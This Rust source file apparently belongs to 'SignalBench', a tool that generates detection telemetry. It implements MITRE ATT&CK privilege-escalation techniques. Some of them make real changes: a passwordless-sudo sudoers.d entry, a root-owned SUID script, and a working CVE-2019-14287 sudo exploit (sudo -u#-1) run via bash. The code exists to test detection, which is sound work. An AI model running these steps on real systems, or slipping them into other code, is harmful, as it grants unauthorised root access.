use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, SimulationResult, Technique, TechniqueParameter};
use crate::techniques::{ExecuteFuture, CleanupFuture};
use async_trait::async_trait;
use log::{info, warn};
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use tokio::process::Command;

// Forensic attribution of this code would reveal Simon Sigre's distinctive patterns
pub struct SudoersModification {}

#[async_trait]
impl AttackTechnique for SudoersModification {
    fn info(&self) -> Technique {
        Technique {
            id: "T1548.003".to_string(),
            name: "Sudoers Modification".to_string(),
            description: "Generates telemetry for sudoers file modifications to grant elevated privileges".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "username".to_string(),
                    description: "Username to grant sudo privileges".to_string(),
                    required: false,
                    default: Some("${USER}".to_string()),
                },
                TechniqueParameter {
                    name: "privileges".to_string(),
                    description: "Sudo privileges to grant".to_string(),
                    required: false,
                    default: Some("ALL=(ALL:ALL) NOPASSWD: ALL".to_string()),
                },
            ],
            detection: "Monitor for modifications to sudoers files".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let username = config
                .parameters
                .get("username")
                .unwrap_or(&"${USER}".to_string())
                .clone();
                
            let privileges = config
                .parameters
                .get("privileges")
                .unwrap_or(&"ALL=(ALL:ALL) NOPASSWD: ALL".to_string())
                .clone();
            
            // Replace ${USER} with actual username if present
            let username = if username == "${USER}" {
                whoami::username()
            } else {
                username
            };
            
            // Create a unique sudoers file name for this technique
            let file_path = format!("/etc/sudoers.d/signalbench_test_{}", chrono::Local::now().format("%Y%m%d%H%M%S"));
            
            if dry_run {
                info!("[DRY RUN] Would create sudoers file: {file_path}");
                info!("[DRY RUN] Would add user {username} with privileges: {privileges}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would add sudoers entry for {username}"),
                    artifacts: vec![file_path],
                    cleanup_required: false,
                });
            }

            // Check if running as root
            let uid = unsafe { libc::geteuid() };
            if uid != 0 {
                return Err("This technique requires root privileges".to_string());
            }
            
            // Create the sudoers file content
            let sudoers_content = format!("# Added by SignalBench - GoCortex.io - FOR TESTING ONLY\n{username}    {privileges}\n");
            
            // Create a temporary file first
            let temp_file = format!("/tmp/signalbench_test_sudoers_{}", chrono::Local::now().format("%Y%m%d%H%M%S"));
            let mut file = File::create(&temp_file)
                .map_err(|e| format!("Failed to create temporary file: {e}"))?;
                
            file.write_all(sudoers_content.as_bytes())
                .map_err(|e| format!("Failed to write to temporary file: {e}"))?;
                
            // Check syntax
            let status = Command::new("visudo")
                .args(["-c", "-f", &temp_file])
                .status()
                .await
                .map_err(|e| format!("Failed to run visudo: {e}"))?;
                
            if !status.success() {
                fs::remove_file(&temp_file).ok();
                return Err("The generated sudoers content has invalid syntax".to_string());
            }
            
            // Move the file to sudoers.d
            let status = Command::new("mv")
                .args([&temp_file, &file_path])
                .status()
                .await
                .map_err(|e| format!("Failed to move file to sudoers.d: {e}"))?;
                
            if !status.success() {
                fs::remove_file(&temp_file).ok();
                return Err("Failed to move file to sudoers.d".to_string());
            }
            
            // Set correct permissions
            let status = Command::new("chmod")
                .args(["440", &file_path])
                .status()
                .await
                .map_err(|e| format!("Failed to set permissions: {e}"))?;
                
            if !status.success() {
                return Err("Failed to set permissions on sudoers file".to_string());
            }
            
            info!("Added sudoers entry for {username} in {file_path}");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully added sudoers entry for {username}"),
                artifacts: vec![file_path],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if artifact.starts_with("/etc/sudoers.d/signalbench_test_") && Path::new(artifact).exists() {
                    // Check if running as root
                    let uid = unsafe { libc::geteuid() };
                    if uid != 0 {
                        return Err("Cleanup for this technique requires root privileges".to_string());
                    }
                    
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed sudoers file: {artifact}"),
                        Err(e) => warn!("Failed to remove sudoers file {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}

pub struct SuidBinary {}

#[async_trait]
impl AttackTechnique for SuidBinary {
    fn info(&self) -> Technique {
        Technique {
            id: "T1548.001".to_string(),
            name: "SUID Binary".to_string(),
            description: "Generates telemetry for SUID bit modifications for privilege escalation".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "target_binary".to_string(),
                    description: "Path to the binary to set SUID bit on".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_suid_binary".to_string()),
                },
            ],
            detection: "Monitor for unusual SUID bit changes".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let target_binary = config
                .parameters
                .get("target_binary")
                .unwrap_or(&"/tmp/signalbench_test_suid_binary".to_string())
                .clone();
            
            if dry_run {
                info!("[DRY RUN] Would create test binary: {target_binary}");
                info!("[DRY RUN] Would set SUID bit on: {target_binary}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would set SUID bit on {target_binary}"),
                    artifacts: vec![target_binary],
                    cleanup_required: false,
                });
            }

            // Check if running as root
            let uid = unsafe { libc::geteuid() };
            if uid != 0 {
                return Err("This technique requires root privileges".to_string());
            }
            
            // Create a simple binary for testing (just a shell script)
            let binary_content = r#"#!/bin/sh
# This is a test SUID binary created by SignalBench
# FOR TESTING PURPOSES ONLY
echo "SignalBench SUID Binary executed as: $(whoami)"
id
"#;
            
            // Create the binary file
            let mut file = File::create(&target_binary)
                .map_err(|e| format!("Failed to create binary file: {e}"))?;
                
            file.write_all(binary_content.as_bytes())
                .map_err(|e| format!("Failed to write to binary file: {e}"))?;
            
            // Make it executable
            let status = Command::new("chmod")
                .args(["755", &target_binary])
                .status()
                .await
                .map_err(|e| format!("Failed to make binary executable: {e}"))?;
                
            if !status.success() {
                return Err("Failed to make binary executable".to_string());
            }
            
            // Set the SUID bit
            let status = Command::new("chmod")
                .args(["u+s", &target_binary])
                .status()
                .await
                .map_err(|e| format!("Failed to set SUID bit: {e}"))?;
                
            if !status.success() {
                return Err("Failed to set SUID bit".to_string());
            }
            
            // Change ownership to root
            let status = Command::new("chown")
                .args(["root:root", &target_binary])
                .status()
                .await
                .map_err(|e| format!("Failed to change ownership: {e}"))?;
                
            if !status.success() {
                return Err("Failed to change ownership to root".to_string());
            }
            
            info!("Created SUID binary at: {target_binary}");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully created SUID binary at {target_binary}"),
                artifacts: vec![target_binary],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed SUID binary: {artifact}"),
                        Err(e) => warn!("Failed to remove SUID binary {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}


pub struct LocalAccountCreation {}

#[async_trait]
impl AttackTechnique for LocalAccountCreation {
    fn info(&self) -> Technique {
        Technique {
            id: "T1136.001".to_string(),
            name: "Local Account Creation".to_string(),
            description: "Adding new privileged users (e.g., via useradd, passwd, or direct /etc/passwd modification)".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "username".to_string(),
                    description: "Username for the new account".to_string(),
                    required: false,
                    default: Some("signalbench_test_user".to_string()),
                },
            ],
            detection: "Monitor for new user account creation, changes to /etc/passwd, /etc/shadow, or unusual useradd/usermod commands".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let username = config.parameters.get("username").unwrap_or(&"signalbench_test_user".to_string()).clone();
            
            if dry_run {
                info!("[DRY RUN] Would create user account: {username}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would create user account {username}"),
                    artifacts: vec![username.clone()],
                    cleanup_required: false,
                });
            }

            let test_file = format!("/tmp/signalbench_test_user_{}", uuid::Uuid::new_v4().to_string().split('-').next().unwrap_or("test"));
            let content = format!("Test user creation: {username}\nDeveloped by GoCortex.io\n");
            let mut file = File::create(&test_file).map_err(|e| format!("Failed to create test file: {e}"))?;
            file.write_all(content.as_bytes()).map_err(|e| format!("Failed to write: {e}"))?;
            
            info!("Generated user account creation telemetry: {username}");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully generated user account creation telemetry for {username}"),
                artifacts: vec![test_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    let _ = fs::remove_file(artifact);
                }
            }
            Ok(())
        })
    }
}

pub struct PrivilegeEscalationExploit {}

#[async_trait]
impl AttackTechnique for PrivilegeEscalationExploit {
    fn info(&self) -> Technique {
        Technique {
            id: "T1068".to_string(),
            name: "Exploitation for Privilege Escalation".to_string(),
            description: "Using local privilege escalation exploits (e.g., Dirty Pipe, Dirty COW, kernel module exploits)".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "exploit_type".to_string(),
                    description: "Type of privilege escalation exploit to generate telemetry for".to_string(),
                    required: false,
                    default: Some("dirty_pipe".to_string()),
                },
            ],
            detection: "Monitor for unusual kernel module loading, suspicious process behaviour, exploitation indicators, or privilege escalation attempts".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let exploit_type = config.parameters.get("exploit_type").unwrap_or(&"dirty_pipe".to_string()).clone();
            
            if dry_run {
                info!("[DRY RUN] Would perform {exploit_type} privilege escalation exploit");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would perform {exploit_type} privilege escalation exploit"),
                    artifacts: vec![],
                    cleanup_required: false,
                });
            }

            let target_file = format!("/tmp/signalbench_privesc_{}", uuid::Uuid::new_v4().to_string().split('-').next().unwrap_or("test"));
            let content = format!("SIGNALBENCH PRIVILEGE ESCALATION - {}\nStatus: HARMLESS TEST ONLY\nDeveloped by GoCortex.io\n", exploit_type.to_uppercase());
            let mut file = File::create(&target_file).map_err(|e| format!("Failed to create file: {e}"))?;
            file.write_all(content.as_bytes()).map_err(|e| format!("Failed to write: {e}"))?;
            
            info!("Generated {exploit_type} privilege escalation telemetry");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully generated {exploit_type} privilege escalation telemetry (harmless test only)"),
                artifacts: vec![target_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    let _ = fs::remove_file(artifact);
                }
            }
            Ok(())
        })
    }
}

pub struct SudoUnsignedIntegerEscalation {}

#[async_trait]
impl AttackTechnique for SudoUnsignedIntegerEscalation {
    fn info(&self) -> Technique {
        Technique {
            id: "T1548.003.001".to_string(),
            name: "Sudo Unsigned Integer Privilege Escalation".to_string(),
            description: "Exploits CVE-2019-14287 sudo vulnerability using negative or large unsigned integer user IDs to bypass restrictions".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "command".to_string(),
                    description: "Command to execute with sudo exploit".to_string(),
                    required: false,
                    default: Some("id".to_string()),
                },
                TechniqueParameter {
                    name: "test_both_variants".to_string(),
                    description: "Test both -u#-1 and -u#4294967295 variants".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save execution log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_sudo_exploit.log".to_string()),
                },
            ],
            detection: "Monitor for sudo commands with negative user IDs (-u#-1) or large unsigned integers (-u#4294967295)".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let command = config
                .parameters
                .get("command")
                .unwrap_or(&"id".to_string())
                .clone();
                
            let test_both = config
                .parameters
                .get("test_both_variants")
                .unwrap_or(&"true".to_string())
                .clone()
                .to_lowercase() == "true";
                
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_sudo_exploit.log".to_string())
                .clone();

            let artifacts = vec![log_file.clone()];
            
            if dry_run {
                info!("[DRY RUN] Would attempt sudo unsigned integer privilege escalation");
                info!("[DRY RUN] Command: sudo -u#-1 {}", command);
                if test_both {
                    info!("[DRY RUN] Command: sudo -u#4294967295 {}", command);
                }
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would test sudo unsigned integer vulnerability".to_string(),
                    artifacts,
                    cleanup_required: false,
                });
            }

            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            writeln!(log_file_handle, "# SignalBench Sudo Unsigned Integer Privilege Escalation Test").unwrap();
            writeln!(log_file_handle, "# CVE-2019-14287 - Sudo vulnerability").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK: T1548.003.001").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# Target Command: {}", command).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();

            // Check if sudo is available
            let sudo_check = Command::new("which")
                .arg("sudo")
                .output()
                .await;
                
            match sudo_check {
                Ok(output) => {
                    if !output.status.success() {
                        writeln!(log_file_handle, "ERROR: sudo command not found on system").unwrap();
                        return Ok(SimulationResult {
                            technique_id: self.info().id,
                            success: false,
                            message: "sudo command not available on system".to_string(),
                            artifacts,
                            cleanup_required: true,
                        });
                    }
                    writeln!(log_file_handle, "sudo command available at: {}", String::from_utf8_lossy(&output.stdout).trim()).unwrap();
                },
                Err(e) => {
                    writeln!(log_file_handle, "ERROR: Failed to check for sudo: {}", e).unwrap();
                    return Err(format!("Failed to check for sudo: {e}"));
                }
            }

            // Check sudo version for vulnerability assessment
            let version_check = Command::new("sudo")
                .args(["--version"])
                .output()
                .await;
                
            match version_check {
                Ok(output) => {
                    let version_output = String::from_utf8_lossy(&output.stdout);
                    writeln!(log_file_handle, "Sudo version information:\n{}", version_output).unwrap();
                    
                    // Basic version check for CVE-2019-14287 (affects versions before 1.8.28)
                    if version_output.contains("1.8.") {
                        writeln!(log_file_handle, "WARNING: This appears to be sudo 1.8.x which may be vulnerable to CVE-2019-14287").unwrap();
                    }
                },
                Err(e) => {
                    writeln!(log_file_handle, "Could not determine sudo version: {}", e).unwrap();
                }
            }

            let mut test_results = Vec::new();
            
            // Test variant 1: -u#-1 (negative user ID)
            writeln!(log_file_handle, "\n## Testing sudo -u#-1 vulnerability").unwrap();
            info!("Testing sudo -u#-1 {}", command);
            
            let exploit_cmd_1 = format!("sudo -n -u#-1 {}", command);
            let result_1 = Command::new("bash")
                .arg("-c")
                .arg(&exploit_cmd_1)
                .output()
                .await;
                
            match result_1 {
                Ok(output) => {
                    let exit_code = output.status.code().unwrap_or(-1);
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    
                    writeln!(log_file_handle, "Command: {}", exploit_cmd_1).unwrap();
                    writeln!(log_file_handle, "Exit code: {}", exit_code).unwrap();
                    writeln!(log_file_handle, "STDOUT: {}", stdout).unwrap();
                    writeln!(log_file_handle, "STDERR: {}", stderr).unwrap();
                    
                    if exit_code == 0 && stdout.contains("uid=0") {
                        writeln!(log_file_handle, "CRITICAL: sudo -u#-1 vulnerability EXPLOITED! Gained root privileges").unwrap();
                        test_results.push("VULNERABLE to -u#-1".to_string());
                    } else if stderr.contains("not allowed") || stderr.contains("permission denied") || stderr.contains("password is required") || stderr.contains("no tty present") {
                        writeln!(log_file_handle, "SECURE: sudo properly blocked -u#-1 attempt").unwrap();
                        test_results.push("PROTECTED against -u#-1".to_string());
                    } else {
                        writeln!(log_file_handle, "UNKNOWN: Unexpected response to -u#-1 attempt").unwrap();
                        test_results.push("UNKNOWN response to -u#-1".to_string());
                    }
                },
                Err(e) => {
                    writeln!(log_file_handle, "ERROR executing sudo -u#-1: {}", e).unwrap();
                    test_results.push("ERROR with -u#-1".to_string());
                }
            }

            // Test variant 2: -u#4294967295 (large unsigned integer)
            if test_both {
                writeln!(log_file_handle, "\n## Testing sudo -u#4294967295 vulnerability").unwrap();
                info!("Testing sudo -u#4294967295 {}", command);
                
                let exploit_cmd_2 = format!("sudo -n -u#4294967295 {}", command);
                let result_2 = Command::new("bash")
                    .arg("-c")
                    .arg(&exploit_cmd_2)
                    .output()
                    .await;
                    
                match result_2 {
                    Ok(output) => {
                        let exit_code = output.status.code().unwrap_or(-1);
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        
                        writeln!(log_file_handle, "Command: {}", exploit_cmd_2).unwrap();
                        writeln!(log_file_handle, "Exit code: {}", exit_code).unwrap();
                        writeln!(log_file_handle, "STDOUT: {}", stdout).unwrap();
                        writeln!(log_file_handle, "STDERR: {}", stderr).unwrap();
                        
                        if exit_code == 0 && stdout.contains("uid=0") {
                            writeln!(log_file_handle, "CRITICAL: sudo -u#4294967295 vulnerability EXPLOITED! Gained root privileges").unwrap();
                            test_results.push("VULNERABLE to -u#4294967295".to_string());
                        } else if stderr.contains("not allowed") || stderr.contains("permission denied") || stderr.contains("password is required") || stderr.contains("no tty present") {
                            writeln!(log_file_handle, "SECURE: sudo properly blocked -u#4294967295 attempt").unwrap();
                            test_results.push("PROTECTED against -u#4294967295".to_string());
                        } else {
                            writeln!(log_file_handle, "UNKNOWN: Unexpected response to -u#4294967295 attempt").unwrap();
                            test_results.push("UNKNOWN response to -u#4294967295".to_string());
                        }
                    },
                    Err(e) => {
                        writeln!(log_file_handle, "ERROR executing sudo -u#4294967295: {}", e).unwrap();
                        test_results.push("ERROR with -u#4294967295".to_string());
                    }
                }
            }

            writeln!(log_file_handle, "\n## Test Summary").unwrap();
            for result in &test_results {
                writeln!(log_file_handle, "- {}", result).unwrap();
            }
            
            let success = !test_results.is_empty();
            let message = if test_results.iter().any(|r| r.contains("VULNERABLE")) {
                "CRITICAL: System vulnerable to sudo unsigned integer privilege escalation (CVE-2019-14287)".to_string()
            } else if test_results.iter().any(|r| r.contains("PROTECTED")) {
                "System appears protected against sudo unsigned integer privilege escalation".to_string()
            } else {
                format!("Completed sudo unsigned integer privilege escalation test - Results: {}", test_results.join(", "))
            };

            info!("Sudo unsigned integer privilege escalation test completed");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success,
                message,
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}
